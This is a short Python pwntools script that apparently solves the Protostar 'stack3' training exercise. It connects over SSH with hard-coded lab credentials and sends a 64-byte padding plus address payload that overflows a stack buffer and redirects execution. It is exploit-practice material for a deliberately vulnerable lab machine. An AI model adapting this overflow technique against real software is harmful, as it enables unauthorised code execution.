from pwn import *

IP = '192.168.43.18'
USER = 'user'
PASS = 'user'
PORT = 22

shell = ssh(user=USER,host=IP,password=PASS,port=PORT)
payload = "A"*64 + "\x24\x48\x80"
r = shell.run("/opt/protostar/bin/stack3")
log.info('sending payload...')
r.sendline(payload)
log.success(r.recvline())
